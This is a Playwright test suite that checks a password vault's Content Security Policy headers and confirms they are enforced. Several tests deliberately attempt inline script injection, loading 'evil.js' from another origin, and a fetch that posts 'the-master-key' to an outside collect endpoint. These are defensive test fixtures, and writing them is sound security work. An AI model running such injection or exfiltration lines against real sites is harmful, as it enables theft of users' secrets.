import { expect, test } from '@playwright/test';
import type { Page } from '@playwright/test';

/**
 * Content Security Policy.
 *
 * For a zero-knowledge product this is not one hardening measure among many.
 * The design rests on the master key never leaving the browser, and the only
 * thing that can take it is script running in this origin. Everything else here
 * assumes the page has not been turned against the user.
 *
 * These tests check the policy is actually enforced, not merely present. A
 * header nobody honours is a header nobody should trust, and the difference
 * only shows up when something tries to break it.
 */

async function cspOf(page: Page, path = '/'): Promise<string> {
  const response = await page.goto(path);
  return response?.headers()['content-security-policy'] ?? '';
}

function directive(policy: string, name: string): string {
  return (
    policy
      .split(';')
      .map((part) => part.trim())
      .find((part) => part.startsWith(`${name} `)) ?? ''
  );
}

test.describe('policy shape', () => {
  test('is served on every page a user reaches', async ({ page }) => {
    for (const path of ['/', '/signup', '/login', '/recover', '/vault']) {
      expect(await cspOf(page, path), `${path} has no policy`).toContain("default-src 'self'");
    }
  });

  test('forbids sending anything off-origin', async ({ page }) => {
    // The directive that matters most. An injected script can still read what
    // the page holds; this stops it posting the result anywhere.
    expect(directive(await cspOf(page), 'connect-src')).toBe("connect-src 'self'");
  });

  test('carries a fresh nonce per response', async ({ page }) => {
    // A nonce reused across responses is decorative: an attacker who sees one
    // page can hardcode it into an injection for the next.
    const first = /'nonce-([^']+)'/.exec(await cspOf(page, '/'))?.[1];
    const second = /'nonce-([^']+)'/.exec(await cspOf(page, '/login'))?.[1];

    expect(first).toBeTruthy();
    expect(second).toBeTruthy();
    expect(first).not.toBe(second);
  });

  test('allows no inline script', async ({ page }) => {
    const scriptSrc = directive(await cspOf(page), 'script-src');
    expect(scriptSrc).not.toContain("'unsafe-inline'");
  });

  test('cannot be framed, and loads no plugins', async ({ page }) => {
    // Clickjacking a vault is a real attack, not a theoretical one.
    const policy = await cspOf(page);
    expect(directive(policy, 'frame-ancestors')).toBe("frame-ancestors 'none'");
    expect(directive(policy, 'object-src')).toBe("object-src 'none'");
  });

  test('pins the base URI and form targets', async ({ page }) => {
    // Both close the "redirect to a lookalike and collect the master password"
    // path from an injected tag.
    const policy = await cspOf(page);
    expect(directive(policy, 'base-uri')).toBe("base-uri 'self'");
    expect(directive(policy, 'form-action')).toBe("form-action 'self'");
  });

  test('permits WebAssembly, without permitting eval', async ({ page }) => {
    // Argon2id is WebAssembly. Without `wasm-unsafe-eval` the browser refuses
    // to instantiate it, and the product has no key derivation at all — no
    // signup, no unlock, no recovery. Development hid this behind
    // `unsafe-eval`, which permits WebAssembly as a side effect, so the first
    // production build could not create an account.
    const scriptSrc = directive(await cspOf(page), 'script-src');

    expect(scriptSrc).toContain("'wasm-unsafe-eval'");
  });

  test('sets each header exactly once', async ({ page }) => {
    // Setting a header in both next.config.ts and the middleware appends rather
    // than replaces on the Workers runtime, producing `DENY, DENY`.
    const response = await page.goto('/');
    const value = response?.headers()['x-frame-options'] ?? '';

    expect(value).toBe('DENY');
    expect(value).not.toContain(',');
  });

  test('sets the rest of the hardening headers', async ({ page }) => {
    const response = await page.goto('/');
    const headers = response?.headers() ?? {};

    expect(headers['x-frame-options']).toBe('DENY');
    expect(headers['x-content-type-options']).toBe('nosniff');
    expect(headers['referrer-policy']).toBe('no-referrer');
    expect(headers['cross-origin-opener-policy']).toBe('same-origin');
    expect(headers['permissions-policy']).toContain('camera=()');
    expect(headers['x-powered-by']).toBeUndefined();
  });
});

test.describe('policy enforcement', () => {
  test('blocks a parser-inserted inline script with no nonce', async ({ page }) => {
    // This is the shape a markup-injection XSS actually takes, and the one the
    // nonce requirement stops.
    //
    // Note what is deliberately *not* asserted here: a script created through
    // the DOM by code already running on the page. `strict-dynamic` trusts
    // those by design, which is the price of a nonce policy that works with a
    // code-split app. Against an attacker who already has script execution,
    // the protection that still matters is `connect-src` — tested below —
    // because it stops them sending anything out.
    await page.goto('/');

    const ran = await page.evaluate(() => {
      try {
        // Split so the closing tag is not written literally into this file,
        // which would end the surrounding script when the spec itself is
        // inlined anywhere.
        document.write(`<script>window.__injected = true;</${'script'}>`);
      } catch {
        // Ignored: what matters is whether it executed.
      }
      return (window as unknown as { __injected?: boolean }).__injected === true;
    });

    expect(ran, 'a parser-inserted inline script executed').toBe(false);
  });

  test('blocks a script loaded from another origin', async ({ page }) => {
    await page.goto('/');

    const loaded = await page.evaluate(
      () =>
        new Promise<boolean>((resolve) => {
          const script = document.createElement('script');
          script.src = 'https://example.com/evil.js';
          script.onload = () => resolve(true);
          script.onerror = () => resolve(false);
          document.head.append(script);
          setTimeout(() => resolve(false), 3000);
        }),
    );

    expect(loaded).toBe(false);
  });

  test('blocks exfiltration to another origin', async ({ page }) => {
    // The scenario the whole policy is built around: script in the page trying
    // to post what it found somewhere else.
    await page.goto('/');

    const sent = await page.evaluate(async () => {
      try {
        await fetch('https://example.com/collect', {
          method: 'POST',
          body: 'the-master-key',
          mode: 'no-cors',
        });
        return true;
      } catch {
        return false;
      }
    });

    expect(sent, 'a cross-origin request succeeded').toBe(false);
  });

  test('the app itself still works under the policy', async ({ page }) => {
    // A policy strict enough to break the product is a policy that gets
    // loosened in a hurry later. Worth proving it does not.
    //
    // This also covers the nonce wiring, which is why there is no separate test
    // counting nonced script tags. Under `strict-dynamic` an unnonced script
    // from the server is simply blocked — so if Next stopped stamping the
    // nonce, the page would not run its own code and this test would fail with
    // the violations collected below. Asserting on the markup instead turned
    // out to be the harder and weaker of the two: the response body is not
    // reliably readable from the test, while "does the app work" is exactly the
    // property that matters.
    const errors: string[] = [];
    page.on('console', (message) => {
      if (message.type() === 'error') errors.push(message.text());
    });

    await page.goto('/signup');
    await page.getByLabel('email').fill('csp@core.test');
    await page.getByLabel('master password', { exact: true }).fill('correct-horse-battery-7391');

    // The strength meter is lazily imported, so this proves dynamic chunks load
    // under `strict-dynamic` rather than only the initial bundle.
    await expect(page.getByTestId('strength-summary')).toBeVisible();

    const cspErrors = errors.filter((error) => /content security policy/i.test(error));
    expect(cspErrors, `the app violated its own policy: ${cspErrors.join('; ')}`).toEqual([]);
  });
});
